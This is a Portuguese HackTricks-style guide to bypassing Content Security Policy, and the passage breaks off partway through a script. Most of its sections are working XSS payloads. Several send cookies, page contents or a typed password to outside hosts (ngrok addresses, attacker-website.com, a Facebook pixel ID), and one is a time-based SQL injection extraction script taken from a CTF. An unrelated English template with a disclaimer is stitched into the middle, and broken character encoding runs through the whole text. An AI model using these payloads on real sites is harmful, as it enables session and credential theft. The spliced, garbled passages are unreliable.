# Bypass de Pol√≠tica de Seguran√ßa de Conte√∫do (CSP)

<details>

<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Junte-se ao servidor [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para se comunicar com hackers experientes e ca√ßadores de recompensas por bugs!

**Percep√ß√µes de Hacking**\
Engaje-se com conte√∫do que explora a emo√ß√£o e os desafios do hacking

**Not√≠cias de Hacking em Tempo Real**\
Mantenha-se atualizado com o mundo acelerado do hacking por meio de not√≠cias e percep√ß√µes em tempo real

**√öltimos An√∫ncios**\
Fique informado sobre os mais recentes programas de recompensas por bugs lan√ßados e atualiza√ß√µes cruciais na plataforma

**Junte-se a n√≥s no** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e comece a colaborar com os melhores hackers hoje!

## O que √© CSP

A Pol√≠tica de Seguran√ßa de Conte√∫do (CSP) √© reconhecida como uma tecnologia de navegador, principalmente destinada a **proteger contra ataques como scripting entre sites (XSS)**. Funciona definindo e detalhando caminhos e fontes das quais os recursos podem ser carregados com seguran√ßa pelo navegador. Esses recursos abrangem uma variedade de elementos, como imagens, frames e JavaScript. Por exemplo, uma pol√≠tica pode permitir o carregamento e execu√ß√£o de recursos do mesmo dom√≠nio (self), incluindo recursos inline e a execu√ß√£o de c√≥digo de string por meio de fun√ß√µes como `eval`, `setTimeout` ou `setInterval`.

A implementa√ß√£o do CSP √© realizada por meio de **cabe√ßalhos de resposta** ou incorporando **elementos meta na p√°gina HTML**. Seguindo essa pol√≠tica, os navegadores aplicam proativamente essas estipula√ß√µes e bloqueiam imediatamente quaisquer viola√ß√µes detectadas.

- Implementado via cabe√ßalho de resposta:
```
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
- Implementado via meta tag:
```xml
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### Cabe√ßalhos

CSP pode ser aplicado ou monitorado usando estes cabe√ßalhos:

* `Content-Security-Policy`: Aplica o CSP; o navegador bloqueia quaisquer viola√ß√µes.
* `Content-Security-Policy-Report-Only`: Usado para monitoramento; relata viola√ß√µes sem bloque√°-las. Ideal para testes em ambientes de pr√©-produ√ß√£o.

### Definindo Recursos

CSP restringe as origens para carregar conte√∫do ativo e passivo, controlando aspectos como a execu√ß√£o de JavaScript inline e o uso de `eval()`. Um exemplo de pol√≠tica √©:
```bash
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### Diretivas

* **script-src**: Permite fontes espec√≠ficas para JavaScript, incluindo URLs, scripts inline e scripts acionados por manipuladores de eventos ou folhas de estilo XSLT.
* **default-src**: Define uma pol√≠tica padr√£o para buscar recursos quando diretivas de busca espec√≠ficas est√£o ausentes.
* **child-src**: Especifica recursos permitidos para workers web e conte√∫dos de frames incorporados.
* **connect-src**: Restringe URLs que podem ser carregadas usando interfaces como fetch, WebSocket, XMLHttpRequest.
* **frame-src**: Restringe URLs para frames.
* **frame-ancestors**: Especifica quais fontes podem incorporar a p√°gina atual, aplic√°vel a elementos como `<frame>`, `<iframe>`, `<object>`, `<embed>` e `<applet>`.
* **img-src**: Define fontes permitidas para imagens.
* **font-src**: Especifica fontes v√°lidas para fontes carregadas usando `@font-face`.
* **manifest-src**: Define fontes permitidas para arquivos de manifesto de aplicativo.
* **media-src**: Define fontes permitidas para carregar objetos de m√≠dia.
* **object-src**: Define fontes permitidas para elementos `<object>`, `<embed>` e `<applet>`.
* **base-uri**: Especifica URLs permitidos para carregar usando elementos `<base>`.
* **form-action**: Lista pontos finais v√°lidos para envios de formul√°rios.
* **plugin-types**: Restringe os tipos MIME que uma p√°gina pode invocar.
* **upgrade-insecure-requests**: Instrui os navegadores a reescrever URLs HTTP para HTTPS.
* **sandbox**: Aplica restri√ß√µes semelhantes ao atributo sandbox de um `<iframe>`.
* **report-to**: Especifica um grupo para o qual um relat√≥rio ser√° enviado se a pol√≠tica for violada.
* **worker-src**: Especifica fontes v√°lidas para scripts de Worker, SharedWorker ou ServiceWorker.
* **prefetch-src**: Especifica fontes v√°lidas para recursos que ser√£o buscados ou pr√©-buscados.
* **navigate-to**: Restringe os URLs para os quais um documento pode navegar por qualquer meio (a, formul√°rio, window.location, window.open, etc.)


### Fontes

* `*`: Permite todos os URLs, exceto aqueles com esquemas `data:`, `blob:`, `filesystem:`.
* `'self'`: Permite o carregamento do mesmo dom√≠nio.
* `'data'`: Permite que recursos sejam carregados via o esquema de dados (por exemplo, imagens codificadas em Base64).
* `'none'`: Bloqueia o carregamento de qualquer fonte.
* `'unsafe-eval'`: Permite o uso de `eval()` e m√©todos similares, n√£o recomendado por motivos de seguran√ßa.
* `'unsafe-hashes'`: Habilita manipuladores de eventos inline espec√≠ficos.
* `'unsafe-inline'`: Permite o uso de recursos inline como `<script>` ou `<style>` inline, n√£o recomendado por motivos de seguran√ßa.
* `'nonce'`: Uma lista branca para scripts inline espec√≠ficos usando um nonce criptogr√°fico (n√∫mero usado uma vez).
* `'sha256-<hash>'`: Lista branca de scripts com um hash sha256 espec√≠fico.
* `'strict-dynamic'`: Permite o carregamento de scripts de qualquer fonte se tiver sido listado na lista branca por um nonce ou hash.
* `'host'`: Especifica um host espec√≠fico, como `example.com`.
* `https:`: Restringe URLs para aqueles que usam HTTPS.
* `blob:`: Permite que recursos sejam carregados a partir de URLs Blob (por exemplo, URLs Blob criados via JavaScript).
* `filesystem:`: Permite que recursos sejam carregados a partir do sistema de arquivos.
* `'report-sample'`: Inclui uma amostra do c√≥digo violador no relat√≥rio de viola√ß√£o (√∫til para depura√ß√£o).
* `'strict-origin'`: Semelhante a 'self', mas garante que o n√≠vel de seguran√ßa do protocolo das fontes corresponda ao documento (apenas origens seguras podem carregar recursos de origens seguras).
* `'strict-origin-when-cross-origin'`: Envia URLs completos ao fazer solicita√ß√µes de mesma origem, mas envia apenas a origem quando a solicita√ß√£o √© de origem cruzada.
* `'unsafe-allow-redirects'`: Permite que recursos sejam carregados e redirecionem imediatamente para outro recurso. N√£o recomendado, pois enfraquece a seguran√ßa.


## Regras CSP Inseguras

### 'unsafe-inline'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
Carga de trabalho em funcionamento: `"/><script>alert(1);</script>`

#### self + 'unsafe-inline' via Iframes

{% content-ref url="csp-bypass-self-+-unsafe-inline-with-iframes.md" %}
[csp-bypass-self-+-unsafe-inline-with-iframes.md](csp-bypass-self-+-unsafe-inline-with-iframes.md)
{% endcontent-ref %}

### 'unsafe-eval'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
Payload de trabalho:
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

Se voc√™ de alguma forma conseguir fazer com que um **c√≥digo JS permitido crie uma nova tag de script** no DOM com seu c√≥digo JS, porque um script permitido est√° criando isso, a **nova tag de script ser√° permitida a ser executada**.

### Wildcard (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
Payload de trabalho:
```markup
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### Falta de object-src e default-src

{% hint style="danger" %}
**Parece que isso n√£o est√° mais funcionando**
{% endhint %}
```yaml
Content-Security-Policy: script-src 'self' ;
```
Cargas de trabalho em funcionamento:
```markup
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### Upload de Arquivo + 'self'
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
Se voc√™ pode fazer upload de um arquivo JS, voc√™ pode contornar esse CSP:

Payload de trabalho:
```markup
"/>'><script src="/uploads/picture.png.js"></script>
```
No entanto, √© altamente prov√°vel que o servidor esteja **validando o arquivo enviado** e s√≥ permitir√° que voc√™ **envie um tipo espec√≠fico de arquivo**.

Al√©m disso, mesmo que voc√™ consiga enviar um **c√≥digo JS dentro** de um arquivo usando uma extens√£o aceita pelo servidor (como: _script.png_), isso n√£o ser√° suficiente porque alguns servidores como o servidor apache **selecionam o tipo MIME do arquivo com base na extens√£o** e navegadores como o Chrome ir√£o **rejeitar a execu√ß√£o de c√≥digo Javascript** dentro de algo que deveria ser uma imagem. "Felizmente", existem falhas. Por exemplo, em um CTF eu aprendi que o **Apache n√£o reconhece** a extens√£o _**.wave**_, portanto n√£o a serve com um **tipo MIME como audio/\***.

A partir daqui, se voc√™ encontrar um XSS e um envio de arquivo, e conseguir encontrar uma **extens√£o mal interpretada**, voc√™ pode tentar enviar um arquivo com essa extens√£o e o conte√∫do do script. Ou, se o servidor estiver verificando o formato correto do arquivo enviado, crie um poliglota ([alguns exemplos de poliglotas aqui](https://github.com/Polydet/polyglot-database)).

### Pontos de Extremidade de Terceiros + ('unsafe-eval')

{% hint style="warning" %}
Para alguns dos payloads a seguir, **`unsafe-eval` nem √© necess√°rio**.
{% endhint %}
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
Carregue uma vers√£o vulner√°vel do angular e execute JS arbitr√°rio:
```xml
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### Payloads usando Angular + uma biblioteca com fun√ß√µes que retornam o objeto `window` ([confira este post](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)):

{% hint style="info" %}
O post mostra que voc√™ poderia **carregar** todas as **bibliotecas** de `cdn.cloudflare.com` (ou de qualquer outro reposit√≥rio de bibliotecas JS permitido), executar todas as fun√ß√µes adicionadas de cada biblioteca e verificar **quais fun√ß√µes de quais bibliotecas retornam o objeto `window`**.
{% endhint %}
```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>
```
#### Abusando do c√≥digo JS do Google reCAPTCHA

De acordo com [**este relat√≥rio de CTF**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?\_x\_tr\_sl=es&\_x\_tr\_tl=en&\_x\_tr\_hl=es&\_x\_tr\_pto=wapp#noteninja-3-solves) voc√™ pode abusar do [https://www.google.com/recaptcha/](https://www.google.com/recaptcha/) dentro de um CSP para executar c√≥digo JS arbitr√°rio, burlando o CSP:
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
### Endpoints de Terceiros + JSONP
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
Cen√°rios como este, onde `script-src` est√° definido como `self` e um dom√≠nio espec√≠fico que est√° na lista branca pode ser contornado usando JSONP. Os pontos finais JSONP permitem m√©todos de retorno de chamada inseguros que permitem a um atacante realizar XSS, payload de trabalho:
```markup
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **cont√©m endpoints JSONP prontos para uso para burlar CSP de diferentes sites.**

A mesma vulnerabilidade ocorrer√° se o **endpoint confi√°vel contiver um Redirecionamento Aberto** porque se o endpoint inicial for confi√°vel, os redirecionamentos tamb√©m s√£o confi√°veis.

### Abusos de Terceiros
Conforme descrito no [post seguinte](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses), existem muitos dom√≠nios de terceiros que podem ser permitidos em algum lugar no CSP e podem ser abusados para exfiltrar dados ou executar c√≥digo JavaScript. Alguns desses terceiros s√£o:

| Entidade | Dom√≠nio Permitido | Capacidades |
|----------|-------------------|-------------|
| Facebook | www.facebook.com, *.facebook.com | Exfil |
| Hotjar | *.hotjar.com, ask.hotjar.io | Exfil |
| Jsdelivr | *.jsdelivr.com, cdn.jsdelivr.net | Exec |
| Amazon CloudFront | *.cloudfront.net | Exfil, Exec |
| Amazon AWS | *.amazonaws.com | Exfil, Exec |
| Azure Websites | *.azurewebsites.net, *.azurestaticapps.net | Exfil, Exec |
| Salesforce Heroku | *.herokuapp.com | Exfil, Exec |
| Google Firebase | *.firebaseapp.com | Exfil, Exec |

Se voc√™ encontrar algum dos dom√≠nios permitidos no CSP do seu alvo, h√° chances de que voc√™ possa burlar o CSP registrando-se no servi√ßo de terceiros e, assim, exfiltrar dados para esse servi√ßo ou executar c√≥digo.

Por exemplo, se voc√™ encontrar o seguinte CSP:
```
Content-Security-Policy‚Äã: default-src 'self‚Äô www.facebook.com;‚Äã
```
# Bypassing Content Security Policy (CSP)

## Introduction

Content Security Policy (CSP) is a security standard that helps prevent cross-site scripting (XSS), clickjacking, and other code injection attacks by allowing web developers to control which resources can be loaded on their websites. However, CSP can sometimes be misconfigured, allowing attackers to bypass its restrictions.

In this guide, we will explore various techniques to bypass CSP protections and execute malicious code on a target website.

## Table of Contents

- [Bypassing CSP with Inline Scripts](bypassing-csp-inline-scripts.md)
- [Bypassing CSP with External Scripts](bypassing-csp-external-scripts.md)
- [Bypassing CSP with Inline Styles](bypassing-csp-inline-styles.md)
- [Bypassing CSP with External Styles](bypassing-csp-external-styles.md)
- [Bypassing CSP with Nonces](bypassing-csp-nonces.md)
- [Bypassing CSP with Trusted Types](bypassing-csp-trusted-types.md)

## Disclaimer

This guide is for educational purposes only. Do not use these techniques for illegal activities.
```
Content-Security-Policy‚Äã: connect-src www.facebook.com;‚Äã
```
Dever√° ser capaz de exfiltrar dados, da mesma forma como sempre foi feito com o [Google Analytics](https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp)/[Google Tag Manager](https://blog.deteact.com/csp-bypass/). Neste caso, siga estes passos gerais:

1. Crie uma conta de desenvolvedor no Facebook aqui.
1. Crie um novo aplicativo "Facebook Login" e selecione "Website".
1. V√° para "Configura√ß√µes -> B√°sico" e obtenha seu "ID do Aplicativo".
1. No site alvo de onde deseja exfiltrar dados, voc√™ pode exfiltrar dados diretamente usando o gadget do Facebook SDK "fbq" atrav√©s de um "customEvent" e a carga de dados.
1. V√° para o "Gerenciador de Eventos" do seu aplicativo e selecione o aplicativo que voc√™ criou (observe que o gerenciador de eventos pode ser encontrado em uma URL semelhante a esta: https://www.facebook.com/events_manager2/list/pixel/[app-id]/test_events
1. Selecione a aba "Eventos de Teste" para ver os eventos sendo enviados pelo site "seu".

Em seguida, no lado da v√≠tima, execute o seguinte c√≥digo para inicializar o pixel de rastreamento do Facebook para apontar para o aplicativo do desenvolvedor do Facebook do atacante com o ID do aplicativo e emitir um evento personalizado como este:
```JavaScript
fbq('init', '1279785999289471');‚Äã // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{‚Äã
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"‚Äã
});
```
Quanto aos outros sete dom√≠nios de terceiros especificados na tabela anterior, existem muitas outras maneiras de abusar deles. Consulte o [post do blog](https://sensepost.com/blog/2023/dress-codethe-talk/#bypasses) anterior para explica√ß√µes adicionais sobre outros abusos de terceiros.

### Bypass via RPO (Relative Path Overwrite) <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

Al√©m da mencionada redire√ß√£o para contornar restri√ß√µes de caminho, existe outra t√©cnica chamada Relative Path Overwrite (RPO) que pode ser usada em alguns servidores.

Por exemplo, se o CSP permitir o caminho `https://example.com/scripts/react/`, ele pode ser contornado da seguinte forma:
```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```
O navegador acabar√° por carregar `https://example.com/scripts/angular/angular.js`.

Isso funciona porque, para o navegador, voc√™ est√° carregando um arquivo chamado `..%2fangular%2fangular.js` localizado em `https://example.com/scripts/react/`, o que est√° em conformidade com CSP.

Assim, eles ir√£o decodific√°-lo, solicitando efetivamente `https://example.com/scripts/react/../angular/angular.js`, o que √© equivalente a `https://example.com/scripts/angular/angular.js`.

Ao **explorar essa inconsist√™ncia na interpreta√ß√£o de URL entre o navegador e o servidor, as regras de caminho podem ser contornadas**.

A solu√ß√£o √© n√£o tratar `%2f` como `/` no lado do servidor, garantindo uma interpreta√ß√£o consistente entre o navegador e o servidor para evitar esse problema.

Exemplo Online: [ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### Execu√ß√£o de JS em Iframes

{% content-ref url="../xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](../xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### **base-uri** ausente

Se a diretiva **base-uri** estiver ausente, voc√™ pode abusar dela para realizar uma [**inje√ß√£o de marca√ß√£o pendente**](../dangling-markup-html-scriptless-injection/).

Al√©m disso, se a **p√°gina estiver carregando um script usando um caminho relativo** (como `<script src="/js/app.js">`) usando um **Nonce**, voc√™ pode abusar da **tag base** para fazer com que ele **carregue** o script do **seu pr√≥prio servidor alcan√ßando um XSS.**\
Se a p√°gina vulner√°vel for carregada com **httpS**, use um URL httpS na base.
```html
<base href="https://www.attacker.com/">
```
### Eventos do AngularJS

Uma pol√≠tica espec√≠fica conhecida como Content Security Policy (CSP) pode restringir eventos JavaScript. No entanto, o AngularJS introduz eventos personalizados como uma alternativa. Dentro de um evento, o AngularJS fornece um objeto √∫nico `$event`, fazendo refer√™ncia ao objeto de evento do navegador nativo. Este objeto `$event` pode ser explorado para contornar o CSP. Notavelmente, no Chrome, o objeto `$event/event` possui um atributo `path`, que cont√©m uma matriz de objetos implicados na cadeia de execu√ß√£o do evento, com o objeto `window` posicionado invariavelmente no final. Esta estrutura √© fundamental para t√°ticas de escape de sandbox.

Ao direcionar esta matriz para o filtro `orderBy`, √© poss√≠vel iterar sobre ela, aproveitando o elemento terminal (o objeto `window`) para acionar uma fun√ß√£o global como `alert()`. O trecho de c√≥digo demonstrado abaixo esclarece este processo:
```xml
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
Este trecho destaca o uso da diretiva `ng-focus` para acionar o evento, empregando `$event.path|orderBy` para manipular o array `path`, e aproveitando o objeto `window` para executar a fun√ß√£o `alert()`, revelando assim `document.cookie`.

**Encontre outras formas de burlar o Angular em** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### AngularJS e dom√≠nio na lista branca
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
Uma pol√≠tica CSP que lista permiss√µes de dom√≠nios para carregamento de scripts em uma aplica√ß√£o Angular JS pode ser contornada atrav√©s da invoca√ß√£o de fun√ß√µes de retorno e certas classes vulner√°veis. Mais informa√ß√µes sobre essa t√©cnica podem ser encontradas em um guia detalhado dispon√≠vel neste [reposit√≥rio git](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh\*t,-it's-CSP!%22).


Cargas de trabalho funcionais:
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
Outros pontos de execu√ß√£o arbitr√°ria JSONP podem ser encontrados [**aqui**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) (alguns deles foram exclu√≠dos ou corrigidos)

### Bypass via Redirection

O que acontece quando CSP encontra uma redire√ß√£o do lado do servidor? Se a redire√ß√£o levar a uma origem diferente que n√£o √© permitida, ela ainda falhar√°.

No entanto, de acordo com a descri√ß√£o em [CSP spec 4.2.2.3. Paths and Redirects](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects), se a redire√ß√£o levar a um caminho diferente, ela pode contornar as restri√ß√µes originais.

Aqui est√° um exemplo:
```html
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="script-src http://localhost:5555 https://www.google.com/a/b/c/d">
</head>
<body>
<div id=userContent>
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```
Se o CSP estiver definido como `https://www.google.com/a/b/c/d`, uma vez que o caminho √© considerado, os scripts `/test` e `/a/test` ser√£o bloqueados pelo CSP.

No entanto, o `http://localhost:5555/301` final ser√° **redirecionado no lado do servidor para `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//`**. Como se trata de um redirecionamento, o **caminho n√£o √© considerado** e o **script pode ser carregado**, contornando assim a restri√ß√£o de caminho.

Com esse redirecionamento, mesmo que o caminho seja especificado completamente, ele ainda ser√° contornado.

Portanto, a melhor solu√ß√£o √© garantir que o site n√£o tenha vulnerabilidades de redirecionamento aberto e que n√£o haja dom√≠nios que possam ser explorados nas regras do CSP.

### Bypass CSP com marca√ß√£o pendente

Leia [aqui](../dangling-markup-html-scriptless-injection/) como fazer.

### 'unsafe-inline'; img-src \*; via XSS
```
default-src 'self' 'unsafe-inline'; img-src *;
```
`'unsafe-inline'` significa que voc√™ pode executar qualquer script dentro do c√≥digo (XSS pode executar c√≥digo) e `img-src *` significa que voc√™ pode usar na p√°gina web qualquer imagem de qualquer recurso.

Voc√™ pode contornar essa CSP exfiltrando os dados por meio de imagens (neste caso, o XSS abusa de um CSRF onde uma p√°gina acess√≠vel pelo bot cont√©m um SQLi e extrai a flag por meio de uma imagem):
```javascript
<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new Image().src='http://PLAYER_SERVER/?'+_)</script>
```
De: [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

Tamb√©m √© poss√≠vel abusar dessa configura√ß√£o para **carregar c√≥digo JavaScript inserido dentro de uma imagem**. Se, por exemplo, a p√°gina permitir o carregamento de imagens do Twitter, voc√™ poderia **criar** uma **imagem especial**, **carreg√°-la** no Twitter e abusar do "**unsafe-inline**" para **executar** um c√≥digo JS (como um XSS regular) que ir√° **carregar** a **imagem**, **extrair** o **JS** dela e **execut√°-lo**: [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### Com Service Workers

A fun√ß√£o **`importScripts`** dos service workers n√£o √© limitada pelo CSP:

{% content-ref url="../xss-cross-site-scripting/abusing-service-workers.md" %}
[abusing-service-workers.md](../xss-cross-site-scripting/abusing-service-workers.md)
{% endcontent-ref %}

### Inje√ß√£o de Pol√≠tica

**Pesquisa:** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

Se um **par√¢metro** enviado por voc√™ est√° sendo **colado dentro** da **declara√ß√£o** da **pol√≠tica**, ent√£o voc√™ poderia **alterar** a **pol√≠tica** de alguma forma que a torne **in√∫til**. Voc√™ poderia **permitir script 'unsafe-inline'** com qualquer um desses bypasses:
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
Porque esta diretiva ir√° **sobrescrever diretivas script-src existentes**.\
Voc√™ pode encontrar um exemplo aqui: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

No Edge √© muito mais simples. Se voc√™ adicionar no CSP apenas isso: **`;_`** o **Edge** ir√° **descartar** toda a **pol√≠tica**.\
Exemplo: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert\(1\)%3C/script%3E)

### img-src \*; via XSS (iframe) - Ataque de tempo

Observe a falta da diretiva `'unsafe-inline'`\
Desta vez, voc√™ pode fazer a v√≠tima **carregar** uma p√°gina sob **seu controle** via **XSS** com um `<iframe`. Desta vez, voc√™ far√° a v√≠tima acessar a p√°gina de onde deseja extrair informa√ß√µes (**CSRF**). Voc√™ n√£o pode acessar o conte√∫do da p√°gina, mas se de alguma forma voc√™ puder **controlar o tempo que a p√°gina precisa para carregar** voc√™ pode extrair as informa√ß√µes necess√°rias.

Desta vez uma **bandeira** ser√° extra√≠da, sempre que um **caractere for corretamente adivinhado** via SQLi a **resposta** levar√° **mais tempo** devido √† fun√ß√£o de sleep. Em seguida, voc√™ poder√° extrair a bandeira:
```html
<!--code from https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle -->
<iframe name=f id=g></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org";
function gen(x) {
x = escape(x.replace(/_/g, '\\_'));
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`;
}

function gen2(x) {
x = escape(x);
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`;
}

async function query(word, end=false) {
let h = performance.now();
f.location = (end ? gen2(word) : gen(word));
await new Promise(r => {
g.onload = r;
});
let diff = performance.now() - h;
return diff > 300;
}

let alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789'.split('');
let postfix = '}'

async function run() {
let prefix = 'nn9ed{';
while (true) {
let i = 0;
for (i;i<alphabet.length;i++) {
let c = alphabet[i];
